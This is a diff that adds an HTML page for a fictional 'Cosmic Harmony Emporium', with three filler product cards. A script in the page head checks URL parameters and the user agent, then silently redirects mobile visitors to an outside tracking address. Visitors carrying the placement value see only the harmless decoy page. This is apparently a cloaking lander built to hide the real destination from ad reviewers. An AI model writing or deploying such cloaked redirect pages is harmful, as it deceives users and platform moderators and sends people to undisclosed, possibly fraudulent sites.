@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Harmony Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF69B4, #00CED1);
+            color: #8B4513;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FFD700;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 5px dashed #4B0082;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 15px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            transform: rotate(3deg);
+        }
+        footer {
+            background-color: #4682B4;
+            color: #FFFACD;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #FF1493;
+            text-decoration: none;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #FF69B4;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Harmony Emporium</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Stardust Serenade</h2>
+            <p>Embrace the celestial rhythms of the universe with our enchanting melodies.</p>
+        </div>
+        <div class="card">
+            <h2>Nebula Nectars</h2>
+            <p>Sip on the essence of distant galaxies with our cosmic beverage collection.</p>
+        </div>
+        <div class="card">
+            <h2>Quantum Quilt Comfort</h2>
+            <p>Wrap yourself in the warmth of multidimensional fabric woven from space-time threads.</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Harmony Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
